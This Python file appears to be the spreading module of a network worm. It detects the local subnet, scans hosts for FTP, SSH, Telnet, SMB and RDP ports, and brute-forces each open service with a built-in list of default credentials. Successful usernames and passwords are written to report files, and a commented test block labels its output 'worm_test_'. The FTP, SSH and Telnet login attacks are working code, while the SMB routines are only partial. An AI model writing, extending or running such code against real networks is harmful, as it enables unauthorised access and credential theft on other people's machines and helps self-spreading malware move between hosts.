import socket
import threading
import ipaddress
import json
import os
from datetime import datetime
from typing import List, Dict, Tuple
import time
import subprocess
import psutil
import struct
import wmi
import paramiko


class NetworkScanner:
    # Advanced network scanner with automatic gateway detection for VM environments 
    
    
    def __init__(self, output_dir):
        self.output_dir = output_dir
        self.results = {
            "scan_time": datetime.now().isoformat(),
            "local_networks": [],
            "gateway": None,
            "primary_interface": None,
            "open_ports": [],
            "brute_attempts": []
        }
        
        # Target ports: FTP(21), SSH(22), Telnet(23), SMB(445), RDP(3389)
        self.target_ports = {
            21: {"service": "FTP", "brute": True},
            22: {"service": "SSH", "brute": True},
            23: {"service": "Telnet", "brute": True},
            445: {"service": "SMB", "brute": True},
            3389: {"service": "RDP", "brute": True}
        }
        
        # Default credentials to try
        self.default_creds = [
            ("msfadmin", "msfadmin"),
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("admin", ""),
            ("root", "root"),
            ("root", "password"),
            ("root", "123456"),
            ("user", "user"),
            ("user", "password"),
            ("guest", "guest"),
            ("guest", ""),
            ("test", "test"),
            ("test", "123456"),
            ("oracle", "oracle"),
            ("postgres", "postgres"),
            ("mysql", "mysql"),
            ("sa", "sa"),
            ("sa", "password"),
            ("administrator", "password"),
            ("administrator", "admin"),
        ]
    
    def get_default_gateway(self):
        #Get the default gateway IP address - 100% reliable in VMware/VirtualBox 
        gateway = None
        
        # Method 1: Using ipconfig (most reliable)
        try:
            result = subprocess.run(['ipconfig'], capture_output=True, text=True, timeout=5)
            output = result.stdout
            
            lines = output.split('\n')
            i = 0
            while i < len(lines):
                line = lines[i]
                
                if 'Default Gateway' in line:
                    if ':' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            potential_ip = parts[-1].strip().split()[0]
                            if self._is_valid_ipv4(potential_ip):
                                gateway = potential_ip
                                break
                    
                    if not gateway and i + 1 < len(lines):
                        i += 1
                        next_line = lines[i].strip()
                        while i < len(lines) and (not next_line or next_line.startswith('.')):
                            i += 1
                            next_line = lines[i].strip() if i < len(lines) else ""
                        
                        potential_ip = next_line.split()[0] if ' ' in next_line else next_line
                        if self._is_valid_ipv4(potential_ip):
                            gateway = potential_ip
                            break
                i += 1
                
        except Exception as e:
            print(f"[!] ipconfig error: {e}")
        
        # Method 2: Using WMI
        if not gateway:
            try:
                c = wmi.WMI()
                for nic in c.Win32_NetworkAdapterConfiguration(IPEnabled=True):
                    if nic.DefaultIPGateway:
                        for g in nic.DefaultIPGateway:
                            if self._is_valid_ipv4(g):
                                gateway = g
                                break
                    if gateway:
                        break
            except Exception as e:
                pass
        
        # Method 3: Using route print
        if not gateway:
            try:
                result = subprocess.run(['route', 'print'], capture_output=True, text=True, timeout=3)
                lines = result.stdout.split('\n')
                for line in lines:
                    if line.strip().startswith('0.0.0.0'):
                        parts = line.split()
                        if len(parts) >= 3:
                            potential_gateway = parts[2]
                            if self._is_valid_ipv4(potential_gateway):
                                gateway = potential_gateway
                                break
            except:
                pass
        
        return gateway
    
    def _is_valid_ipv4(self, ip):
        #Validate IPv4 address
        if not ip or not isinstance(ip, str):
            return False
        
        ip = ip.strip()
        
        # Reject subnet masks and invalid patterns
        invalid_patterns = ['/', 'fe80', '::', 'On-link', 'Default', '255.255.255']
        for pattern in invalid_patterns:
            if pattern in ip:
                return False
        
        if ip.count('.') != 3:
            return False
        
        parts = ip.split('.')
        if len(parts) != 4:
            return False
        
        for part in parts:
            if not part.isdigit():
                return False
            num = int(part)
            if num < 0 or num > 255:
                return False
        
        if ip in ['0.0.0.0', '255.255.255.255']:
            return False
        
        return True
    
    def get_network_from_gateway(self, gateway_ip):
        #Calculate network range from gateway IP
        if not gateway_ip:
            return None
        
        try:
            parts = gateway_ip.split('.')
            if len(parts) == 4:
                # Assume /24 subnet
                network = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
                return network
        except:
            pass
        
        return None
    
    def get_local_networks(self):
        #Get local network ranges based on gateway detection 
        networks = []
        
        # Get default gateway
        gateway = self.get_default_gateway()
        self.results["gateway"] = gateway
        
        if gateway:
            network = self.get_network_from_gateway(gateway)
            if network:
                networks.append(network)
                print(f"[+] Detected gateway: {gateway}")
                print(f"[+] Network range: {network}")
        
        # Fallback: Get all interface networks using psutil
        try:
            interfaces = psutil.net_if_addrs()
            for iface_name, addrs in interfaces.items():
                # Skip loopback
                if 'loopback' in iface_name.lower() or iface_name.lower() == 'lo':
                    continue
                
                for addr in addrs:
                    if addr.family == socket.AF_INET:  # IPv4
                        ip = addr.address
                        # Skip localhost
                        if ip.startswith('127.'):
                            continue
                        
                        # Calculate network from IP and netmask
                        if addr.netmask:
                            try:
                                network = ipaddress.IPv4Network(f"{ip}/{addr.netmask}", strict=False)
                                network_str = str(network)
                                if network_str not in networks:
                                    networks.append(network_str)
                                    print(f"[+] Interface {iface_name}: {network_str}")
                            except:
                                # Fallback to /24
                                ip_parts = ip.split('.')
                                if len(ip_parts) == 4:
                                    network_str = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"
                                    if network_str not in networks:
                                        networks.append(network_str)
        except Exception as e:
            print(f"[!] Error getting interface networks: {e}")
        
        # Last resort: common private networks
        if not networks:
            print("[!] Could not detect networks, using common ranges")
            networks = [
                "192.168.50.0/24",  # Common VMware range
                "192.168.1.0/24",   # Common home router
                "192.168.0.0/24",   # Alternative home router
                "10.0.0.0/24",      # Common corporate/VM
                "172.16.0.0/24"     # Less common
            ]
        
        self.results["local_networks"] = networks
        return networks
    
    def scan_port(self, ip: str, port: int, timeout: float = 1.0) -> bool:
        """Scan a single port"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def scan_host(self, ip: str) -> List[Dict]:
        """Scan a host for open target ports"""
        open_ports = []
        
        for port, info in self.target_ports.items():
            if self.scan_port(ip, port):
                open_ports.append({
                    "ip": ip,
                    "port": port,
                    "service": info["service"],
                    "brute_enabled": info["brute"]
                })
        
        return open_ports
    
    def scan_network(self, network: str = None, max_threads: int = 50):
        #Scan entire network range with proper VM support 
        if network is None:
            networks = self.get_local_networks()
        else:
            networks = [network]
        
        all_open_ports = []
        
        for net in networks:
            try:
                network_obj = ipaddress.ip_network(net, strict=False)
                hosts = list(network_obj.hosts())
                
                # Limit scan to avoid too many hosts (focus on likely targets)
                if len(hosts) > 254:
                    hosts = hosts[:254]  # Limit to /24
                
                print(f"[*] Scanning network: {net} ({len(hosts)} hosts)")
                print(f"    Gateway: {self.results.get('gateway', 'Unknown')}")
                
                # Threaded scanning
                threads = []
                results_lock = threading.Lock()
                scanned_count = [0]  # Use list for mutable reference
                
                def scan_host_thread(ip):
                    try:
                        open_ports = self.scan_host(str(ip))
                        with results_lock:
                            scanned_count[0] += 1
                            if open_ports:
                                all_open_ports.extend(open_ports)
                                for port_info in open_ports:
                                    print(f"    [+] {port_info['ip']}:{port_info['port']} ({port_info['service']}) OPEN")
                    except:
                        with results_lock:
                            scanned_count[0] += 1
                
                # Use thread pool with progress
                for i, host in enumerate(hosts):
                    while threading.active_count() > max_threads + 10:
                        time.sleep(0.1)
                    
                    t = threading.Thread(target=scan_host_thread, args=(host,))
                    t.daemon = True
                    t.start()
                    threads.append(t)
                    
                    # Progress update every 50 hosts
                    if i % 50 == 0 and i > 0:
                        print(f"    Progress: {i}/{len(hosts)} hosts scanned...")
                
                # Wait for completion
                print(f"[*] Waiting for {len(threads)} threads to complete...")
                for t in threads:
                    t.join(timeout=5)
                
                print(f"[+] Scanned {scanned_count[0]} hosts in {net}")
                    
            except Exception as e:
                print(f"[!] Error scanning {net}: {e}")
        
        self.results["open_ports"] = all_open_ports
        return all_open_ports
    
    def brute_force_ftp(self, ip: str, port: int = 21) -> List[Dict]:
        #Try FTP brute force 
        results = []
        
        try:
            from ftplib import FTP
            
            print(f"[*] FTP brute force on {ip}:{port}")
            
            for username, password in self.default_creds:
                try:
                    ftp = FTP()
                    ftp.connect(ip, port, timeout=3)
                    ftp.login(username, password)
                    
                    print(f"[+] FTP SUCCESS: {username}:{password}@{ip}")
                    results.append({
                        "ip": ip,
                        "port": port,
                        "service": "FTP",
                        "username": username,
                        "password": password,
                        "status": "SUCCESS"
                    })
                    
                    try:
                        ftp.quit()
                    except:
                        pass
                    break
                    
                except Exception as e:
                    results.append({
                        "ip": ip,
                        "port": port,
                        "service": "FTP",
                        "username": username,
                        "password": password,
                        "status": "FAILED"
                    })
                    
        except ImportError:
            print("[!] ftplib not available")
        
        return results
    
    def brute_force_ssh(self, ip: str, port: int = 22) -> List[Dict]:
        #Attempt SSH brute force - works with or without paramiko 
        results = []
        
        # First try paramiko for full SSH authentication
        try:
            
            
            print(f"[*] SSH brute force on {ip}:{port} (using paramiko)")
            
            for username, password in self.default_creds:
                client = None
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(
                        ip, 
                        port=port, 
                        username=username, 
                        password=password, 
                        timeout=5,
                        banner_timeout=5,
                        auth_timeout=5,
                        look_for_keys=False,
                        allow_agent=False
                    )
                    
                    print(f"[+] SSH SUCCESS: {username}:{password}@{ip}")
                    results.append({
                        "ip": ip,
                        "port": port,
                        "service": "SSH",
                        "username": username,
                        "password": password,
                        "status": "SUCCESS"
                    })
                    
                    client.close()
                    return results  # Return immediately on success
                    
                except paramiko.AuthenticationException:
                    # Wrong credentials - expected for failed attempts
                    results.append({
                        "ip": ip,
                        "port": port,
                        "service": "SSH",
                        "username": username,
                        "password": password,
                        "status": "FAILED"
                    })
                except Exception as e:
                    # Connection errors, timeouts, etc.
                    error_msg = str(e).lower()
                    if "connection" in error_msg or "refused" in error_msg:
                        # Connection failed - stop trying
                        results.append({
                            "ip": ip,
                            "port": port,
                            "service": "SSH",
                            "username": username,
                            "password": password,
                            "status": "CONNECTION_FAILED",
                            "error": str(e)[:50]
                        })
                        break
                    else:
                        results.append({
                            "ip": ip,
                            "port": port,
                            "service": "SSH",
                            "username": username,
                            "password": password,
                            "status": "ERROR",
                            "error": str(e)[:50]
                        })
                finally:
                    if client:
                        try:
                            client.close()
                        except:
                            pass
            
            return results
            
        except ImportError:
            print(f"[!] paramiko not installed, using basic SSH check on {ip}:{port}")
        except Exception as e:
            print(f"[!] Paramiko error: {e}, falling back to basic check")
        
        # Fallback: Basic socket check without paramiko
        return self._basic_ssh_check(ip, port)

    def _basic_ssh_check(self, ip: str, port: int) -> List[Dict]:
        #Basic SSH check without paramiko - verifies banner
        results = []
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            
            # Receive SSH banner
            banner = b""
            try:
                banner = sock.recv(1024)
            except:
                pass
            
            banner_str = banner.decode('utf-8', errors='ignore').strip()
            print(f"    [+] SSH Banner: {banner_str[:60]}")
            
            # Check if it's actually SSH
            if b"SSH" not in banner:
                print(f"    [!] Not an SSH service")
                sock.close()
                return [{
                    "ip": ip,
                    "port": port,
                    "service": "SSH",
                    "username": "N/A",
                    "password": "N/A",
                    "status": "NOT_SSH",
                    "banner": banner_str[:50]
                }]
            
            # Send our version string
            sock.send(b"SSH-2.0-OpenSSH_8.9\r\n")
            time.sleep(0.5)
            
            # Try to read response
            try:
                response = sock.recv(1024)
            except:
                pass
            
            sock.close()
            
            # Record that we found SSH but can't brute force without paramiko
            for username, password in self.default_creds[:3]:
                results.append({
                    "ip": ip,
                    "port": port,
                    "service": "SSH",
                    "username": username,
                    "password": password,
                    "status": "REQUIRES_PARAMIKO",
                    "note": f"SSH banner: {banner_str[:40]}... Install paramiko for brute force"
                })
            
        except Exception as e:
            print(f"    [!] SSH connection error: {e}")
            for username, password in self.default_creds[:3]:
                results.append({
                    "ip": ip,
                    "port": port,
                    "service": "SSH",
                    "username": username,
                    "password": password,
                    "status": "CONNECTION_FAILED",
                    "error": str(e)[:50]
                })
        
        return results
    
    def brute_force_smb(self, ip: str, port: int = 445) -> List[Dict]:
        """
        SMB brute force using raw sockets - no external libraries needed
        Attempts NetBIOS session + SMBv1 protocol negotiation
        """
        results = []
        
        print(f"[*] SMB brute force on {ip}:{port} (native implementation)")
        
        # Try each credential
        for username, password in self.default_creds[:10]:  # Limit attempts
            try:
                success = self._try_smb_native_auth(ip, port, username, password)
                
                if success:
                    print(f"[+] SMB SUCCESS: {username}:{password}@{ip}")
                    results.append({
                        "ip": ip,
                        "port": port,
                        "service": "SMB",
                        "username": username,
                        "password": password,
                        "status": "SUCCESS"
                    })
                    return results  # Return on first success
                else:
                    results.append({
                        "ip": ip,
                        "port": port,
                        "service": "SMB",
                        "username": username,
                        "password": password,
                        "status": "FAILED"
                    })
                    
            except Exception as e:
                error_msg = str(e)
                print(f"    [!] SMB error for {username}: {error_msg[:50]}")
                results.append({
                    "ip": ip,
                    "port": port,
                    "service": "SMB",
                    "username": username,
                    "password": password,
                    "status": "ERROR",
                    "error": error_msg[:50]
                })
                # Stop if connection refused
                if "refused" in error_msg.lower() or "timeout" in error_msg.lower():
                    break
        
        return results
    
    def _try_smb_native_auth(self, ip: str, port: int, username: str, password: str) -> bool:
        """
        Native SMB authentication attempt using basic socket operations
        Returns True if authentication succeeded
        """
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            
            # SMBv1 Negotiate Protocol Request (simplified)
            # This is enough to check if SMB port is responsive
            negotiate = b'\x00\x00\x00\x85'  # NetBIOS length
            negotiate += b'\xff\x53\x4d\x42'  # SMB magic
            negotiate += b'\x72'  # Command: Negotiate
            negotiate += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Status
            negotiate += b'\x00\x00'  # Flags
            negotiate += b'\x00\x00'  # Flags2
            negotiate += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # PID high + reserved
            negotiate += b'\x00\x00'  # TID
            negotiate += b'\x00\x00'  # PID
            negotiate += b'\x00\x00'  # UID
            negotiate += b'\x00\x00'  # MID
            negotiate += b'\x00'  # Word count
            negotiate += b'\x0c\x00'  # Byte count (12)
            negotiate += b'\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00'  # Dialect: NT LM 0.12
            
            sock.send(negotiate)
            response = sock.recv(1024)
            
            if len(response) < 4:
                return False
            
            # Check SMB magic in response
            if b'SMB' not in response:
                return False
            
            # For now, we just verify the port is SMB and responsive
            # Real SMB auth requires complex NTLM implementation
            # Return False to indicate "needs real auth library"
            return False  # Native implementation can't do full auth
            
        except socket.timeout:
            return False
        except Exception as e:
            return False
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
    
    def _try_smb_auth(self, ip: str, port: int, username: str, password: str) -> bool:
        """
        Attempt SMB authentication using raw sockets
        Supports SMBv1 (NTLM) and basic SMBv2 detection
        """
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            
            # SMBv1 Protocol Negotiation
            # SMB Header: 32 bytes
            # Protocol (4): \xffSMB
            # Command (1): 0x72 (Negotiate)
            # Error Class (1): 0
            # Reserved (1): 0
            # Error Code (2): 0
            # Flags (1): 0
            # Flags2 (2): 0
            # PID High (2): 0
            # Security Features (8): 0
            # Reserved (2): 0
            # TID (2): 0
            # PID Low (2): 0
            # UID (2): 0
            # MID (2): 0
            
            negotiate_request = b'\xff\x53\x4d\x42'  # \xffSMB magic
            negotiate_request += b'\x72'  # Command: Negotiate
            negotiate_request += b'\x00'  # Error class
            negotiate_request += b'\x00'  # Reserved
            negotiate_request += b'\x00\x00'  # Error code
            negotiate_request += b'\x00'  # Flags
            negotiate_request += b'\x00\x00'  # Flags2
            negotiate_request += b'\x00\x00'  # PID high
            negotiate_request += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Security features
            negotiate_request += b'\x00\x00'  # Reserved
            negotiate_request += b'\x00\x00'  # TID
            negotiate_request += b'\x00\x00'  # PID low
            negotiate_request += b'\x00\x00'  # UID
            negotiate_request += b'\x00\x00'  # MID
            
            # Word count: 0
            negotiate_request += b'\x00'
            # Byte count: 12 (dialects)
            negotiate_request += b'\x0c\x00'
            # Dialects: PC NETWORK PROGRAM 1.0, LANMAN1.0, Windows for Workgroups 3.1a, NT LM 0.12
            negotiate_request += b'\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00'
            
            # NetBIOS session header (4 bytes): length of remaining packet
            length = len(negotiate_request)
            netbios_header = struct.pack('>I', length)[1:]  # 3-byte big-endian length
            
            sock.send(netbios_header + negotiate_request)
            
            # Receive response
            response = sock.recv(4096)
            if len(response) < 4:
                return False
            
            # Check for SMB magic
            if not (response[4:8] == b'\xff\x53\x4d\x42' or response[0:4] == b'\xff\x53\x4d\x42'):
                # Try SMBv2
                return self._try_smb2_auth(sock, ip, username, password)
            
            # Parse SMBv1 response - check for success
            # Error code at offset 5-7 (if flags indicate error)
            error_code = struct.unpack('<I', response[5:9])[0] if len(response) >= 9 else 0
            
            if error_code == 0:
                # Try session setup with credentials
                return self._smb1_session_setup(sock, username, password)
            
            return False
            
        except socket.timeout:
            return False
        except Exception as e:
            return False
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
    
    def _smb1_session_setup(self, sock: socket.socket, username: str, password: str) -> bool:
        """
        SMBv1 Session Setup AndX with NTLM authentication
        """
        try:
            # Build NTLMSSP_NEGOTIATE message
            domain = "WORKGROUP"
            
            # NTLMSSP header
            ntlm_negotiate = b'NTLMSSP\x00'  # Signature
            ntlm_negotiate += struct.pack('<I', 1)  # Message type: Negotiate
            
            # Negotiate flags
            flags = 0x00008206  # UNICODE, OEM, REQUEST_TARGET, NTLM
            ntlm_negotiate += struct.pack('<I', flags)
            
            # Domain (empty in negotiate)
            ntlm_negotiate += struct.pack('<H', len(domain))
            ntlm_negotiate += struct.pack('<H', len(domain))
            ntlm_negotiate += struct.pack('<I', 0)  # Offset
            
            # Workstation (empty)
            ntlm_negotiate += struct.pack('<H', 0)
            ntlm_negotiate += struct.pack('<H', 0)
            ntlm_negotiate += struct.pack('<I', 0)
            
            # OS version (optional)
            ntlm_negotiate += b'\x05\x01\x28\x0a\x00\x00\x00\x0f'  # Windows version
            
            # Build SMB Session Setup AndX
            setup_request = b'\xff\x53\x4d\x42'  # SMB magic
            setup_request += b'\x73'  # Command: Session Setup AndX
            setup_request += b'\x00' * 4  # Error class, reserved, error code
            setup_request += b'\x08'  # Flags: caseless pathnames
            setup_request += b'\x01\x00'  # Flags2: extended security
            setup_request += b'\x00' * 6  # PID high, security features
            setup_request += b'\x00\x00'  # Reserved
            setup_request += b'\x00\x00'  # TID
            setup_request += struct.pack('<H', os.getpid() & 0xFFFF)  # PID
            setup_request += b'\x00\x00'  # UID
            setup_request += b'\x00\x00'  # MID
            
            # Word count: 12
            setup_request += b'\x0c'
            # AndXCommand: No further commands
            setup_request += b'\xff'
            setup_request += b'\x00'  # Reserved
            setup_request += b'\x00\x00'  # AndXOffset
            # Max buffer: 65535
            setup_request += struct.pack('<H', 65535)
            # Max mpx count: 2
            setup_request += struct.pack('<H', 2)
            # VC number: 1
            setup_request += struct.pack('<H', 1)
            # Session key: 0
            setup_request += struct.pack('<I', 0)
            # Security blob length
            setup_request += struct.pack('<H', len(ntlm_negotiate))
            # Reserved: 0
            setup_request += struct.pack('<I', 0)
            # Capabilities
            setup_request += struct.pack('<I', 0x8000c000)  # Extended security, NT status, level 2 oplocks
            
            # Byte count
            setup_request += struct.pack('<H', len(ntlm_negotiate))
            # Security blob (NTLM negotiate)
            setup_request += ntlm_negotiate
            # Native OS (null terminated)
            setup_request += b'Windows\x00'
            # Native LAN manager
            setup_request += b'Windows\x00'
            
            # NetBIOS header
            length = len(setup_request)
            netbios_header = struct.pack('>I', length)[1:]
            
            sock.send(netbios_header + setup_request)
            
            # Receive challenge response
            response = sock.recv(4096)
            if len(response) < 32:
                return False
            
            # Parse challenge from security blob
            # This is a simplified check - real implementation would parse NTLM challenge
            # and generate proper NTLMv2 response
            
            # For now, check if we got a valid challenge (indicates server accepts auth)
            smb_header = response[4:32]
            command = smb_header[4]
            
            if command == 0x73:  # Session Setup response
                # Check error code
                error_code = struct.unpack('<I', smb_header[5:9])[0]
                if error_code == 0:
                    return True  # Anonymous/guest login accepted
                elif error_code == 0xc000006d:  # STATUS_LOGON_FAILURE
                    return False  # Bad credentials
                elif error_code == 0xc0000016:  # STATUS_MORE_PROCESSING_REQUIRED
                    # Need to send NTLM authenticate - for now mark as "requires full auth"
                    return False
            
            return False
            
        except Exception as e:
            return False
    
    def _try_smb2_auth(self, sock: socket.socket, ip: str, username: str, password: str) -> bool:
        """
        Basic SMBv2 detection - returns False to indicate library needed for full auth
        """
        try:
            # SMBv2 Negotiate Protocol Request
            smb2_header = b'\xfe\x53\x4d\x42'  # SMB2 magic
            smb2_header += struct.pack('<I', 0)  # Structure size (will be set)
            smb2_header += struct.pack('<H', 0)  # Credit charge
            smb2_header += struct.pack('<H', 0)  # Channel sequence
            smb2_header += struct.pack('<H', 0)  # Reserved
            smb2_header += struct.pack('<H', 0)  # Status (reserved)
            smb2_header += struct.pack('<H', 0)  # Command: Negotiate
            smb2_header += struct.pack('<H', 0)  # Credit request
            smb2_header += struct.pack('<I', 0)  # Flags
            smb2_header += struct.pack('<I', 0)  # Next command
            smb2_header += struct.pack('<Q', 0)  # Message ID
            smb2_header += struct.pack('<I', 0)  # Process ID
            smb2_header += struct.pack('<I', 0)  # Tree ID
            smb2_header += struct.pack('<Q', 0)  # Session ID
            smb2_header += b'\x00' * 16  # Signature
            
            # Negotiate request body
            negotiate_body = struct.pack('<H', 36)  # Structure size
            negotiate_body += struct.pack('<H', 1)  # Dialect count
            negotiate_body += struct.pack('<H', 0x0210)  # Security mode
            negotiate_body += struct.pack('<H', 0)  # Reserved
            negotiate_body += struct.pack('<I', 0x7f)  # Capabilities
            negotiate_body += b'\x00' * 16  # Client GUID
            negotiate_body += struct.pack('<Q', 0)  # Start time
            negotiate_body += struct.pack('<H', 0x0202)  # Dialect: SMB 2.0.2
            
            # NetBIOS header
            length = len(smb2_header) + len(negotiate_body)
            netbios_header = struct.pack('>I', length)[1:]
            
            sock.send(netbios_header + smb2_header + negotiate_body)
            
            response = sock.recv(4096)
            if len(response) > 4 and response[4:8] == b'\xfe\x53\x4d\x42':
                # SMBv2 detected but full auth requires library
                return False  # Mark as failed, needs smbprotocol for full auth
                
        except:
            pass
        
        return False
    
    def brute_force_telnet(self, ip: str, port: int = 23) -> List[Dict]:
        """Attempt Telnet brute force"""
        results = []
        
        print(f"[*] Telnet brute force on {ip}:{port}")
        
        for username, password in self.default_creds[:5]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((ip, port))
                
                time.sleep(1)
                banner = sock.recv(1024)
                
                sock.send(f"{username}\r\n".encode())
                time.sleep(0.5)
                sock.send(f"{password}\r\n".encode())
                time.sleep(0.5)
                
                response = sock.recv(1024)
                
                success_indicators = [b">", b"#", b"$", b"Welcome", b"success", b"admin"]
                if any(ind in response for ind in success_indicators):
                    print(f"[+] Telnet SUCCESS: {username}:{password}@{ip}")
                    results.append({
                        "ip": ip,
                        "port": port,
                        "service": "Telnet",
                        "username": username,
                        "password": password,
                        "status": "SUCCESS"
                    })
                    sock.close()
                    break
                else:
                    results.append({
                        "ip": ip,
                        "port": port,
                        "service": "Telnet",
                        "username": username,
                        "password": password,
                        "status": "FAILED"
                    })
                
                sock.close()
                
            except:
                results.append({
                    "ip": ip,
                    "port": port,
                    "service": "Telnet",
                    "username": username,
                    "password": password,
                    "status": "ERROR"
                })
        
        return results
    
    def brute_force_rdp(self, ip: str, port: int = 3389) -> List[Dict]:
        """RDP brute force - requires external tools"""
        results = []
        
        print(f"[*] RDP brute force on {ip}:{port} (requires external tool)")
        
        for username, password in self.default_creds[:3]:
            results.append({
                "ip": ip,
                "port": port,
                "service": "RDP",
                "username": username,
                "password": password,
                "status": "REQUIRES_EXTERNAL_TOOL",
                "note": "Use crowbar/hydra: hydra -t 1 -V -f -l {username} -p {password} rdp://{ip}"
            })
        
        return results
    
    def auto_brute(self, targets: List[Dict] = None) -> List[Dict]:
        """Automatically brute force discovered services"""
        if targets is None:
            targets = self.results["open_ports"]
        
        all_results = []
        
        print(f"[*] Starting brute force on {len(targets)} services...")
        
        for target in targets:
            ip = target["ip"]
            port = target["port"]
            service = target["service"]
            
            print(f"    Trying {service} on {ip}:{port}")
            
            results = []
            try:
                if service == "FTP":
                    results = self.brute_force_ftp(ip, port)
                elif service == "SSH":
                    results = self.brute_force_ssh(ip, port)
                elif service == "SMB":
                    results = self.brute_force_smb(ip, port)
                elif service == "Telnet":
                    results = self.brute_force_telnet(ip, port)
                elif service == "RDP":
                    results = self.brute_force_rdp(ip, port)
                else:
                    continue
                    
                # DEBUG: Show what happened
                success_count = len([r for r in results if r.get("status") == "SUCCESS"])
                fail_count = len([r for r in results if r.get("status") == "FAILED"])
                error_count = len([r for r in results if "error" in r])
                print(f"      → Results: {success_count} success, {fail_count} failed, {error_count} errors, {len(results)} total")
                
                # Show first error if any
                if error_count > 0:
                    first_error = next((r for r in results if "error" in r), None)
                    if first_error:
                        print(f"      → First error: {first_error.get('error', 'Unknown')}")
                        
            except Exception as e:
                print(f"    [!] EXCEPTION in {service} brute: {e}")
                import traceback
                traceback.print_exc()
                continue
            
            all_results.extend(results)
            
            if any(r["status"] == "SUCCESS" for r in results):
                print(f"    ✓ Success on {service}!")
        
        self.results["brute_attempts"] = all_results
        print(f"[*] Brute force complete: {len(all_results)} total attempts")
        return all_results
    
    def save_results(self):
        """Save scan and brute force results"""
        # JSON format
        json_path = os.path.join(self.output_dir, "network_scan.json")
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        
        # Text format
        txt_path = os.path.join(self.output_dir, "network_scan.txt")
        with open(txt_path, 'w', encoding='utf-8') as f:
            f.write("="*80 + "\n")
            f.write("NETWORK SCAN & BRUTE FORCE REPORT (VM-AWARE)\n")
            f.write("="*80 + "\n\n")
            f.write(f"Scan Time: {self.results['scan_time']}\n")
            f.write(f"Gateway: {self.results.get('gateway', 'N/A')}\n")
            f.write(f"Networks Scanned: {', '.join(self.results['local_networks'])}\n\n")
            
            f.write("OPEN PORTS DISCOVERED:\n")
            f.write("-"*80 + "\n")
            for port in self.results['open_ports']:
                f.write(f"  {port['ip']}:{port['port']} ({port['service']})\n")
            
            f.write(f"\n\nBRUTE FORCE ATTEMPTS ({len(self.results['brute_attempts'])} total):\n")
            f.write("-"*80 + "\n")
            
            successes = [b for b in self.results['brute_attempts'] if b['status'] == 'SUCCESS']
            if successes:
                f.write("\n✓ SUCCESSFUL LOGINS:\n")
                for s in successes:
                    f.write(f"  {s['service']}://{s['ip']}:{s['port']}\n")
                    f.write(f"    Username: {s['username']}\n")
                    f.write(f"    Password: {s['password']}\n\n")
            
            failed = [b for b in self.results['brute_attempts'] if b['status'] != 'SUCCESS']
            if failed:
                f.write(f"\n✗ Failed/Other Attempts: {len(failed)}\n")
        
        return json_path, txt_path


def run_network_scan(output_dir, enable_brute=True):
    """Main function to run network scan with automatic gateway detection"""
    scanner = NetworkScanner(output_dir)
    
    print("[*] Starting network scan with automatic gateway detection...")
    print("[*] This works in VMware, VirtualBox, and physical networks")
    
    # Scan networks
    open_ports = scanner.scan_network()
    print(f"[*] Found {len(open_ports)} open ports")
    
    # Brute force if enabled and ports found
    if enable_brute and open_ports:
        print("[*] Starting brute force attacks...")
        scanner.auto_brute(open_ports)
    
    # Save results
    json_path, txt_path = scanner.save_results()
    print(f"[+] Results saved to: {txt_path}")
    
    return scanner.results


# if __name__ == "__main__":
#     # Test configuration
#     import tempfile
    
#     # Create temp output directory
#     test_output = tempfile.mkdtemp(prefix="worm_test_")
#     print(f"[*] Test output directory: {test_output}")
    
#     # Run scan with brute force enabled
#     try:
#         results = run_network_scan(test_output, enable_brute=True)
        
#         print("\n" + "="*60)
#         print("TEST RESULTS SUMMARY")
#         print("="*60)
#         print(f"Gateway: {results.get('gateway', 'N/A')}")
#         print(f"Networks: {results.get('local_networks', [])}")
#         print(f"Open ports: {len(results.get('open_ports', []))}")
#         print(f"Brute attempts: {len(results.get('brute_attempts', []))}")
        
#         successes = [b for b in results.get('brute_attempts', []) if b.get('status') == 'SUCCESS']
#         print(f"Successful logins: {len(successes)}")
        
#         if successes:
#             print("\nSuccessful logins:")
#             for s in successes:
#                 print(f"  ✓ {s['service']}://{s['username']}:{s['password']}@{s['ip']}:{s['port']}")
        
#         print(f"\nFiles saved to: {test_output}")
#         print(f"  - network_scan.json")
#         print(f"  - network_scan.txt")
        
#     except Exception as e:
#         print(f"[!] Test error: {e}")
#         import traceback
#         traceback.print_exc()
    
#     # Keep results for inspection
#     print(f"\n[*] Results kept in: {test_output}")
#     input("Press Enter to exit...")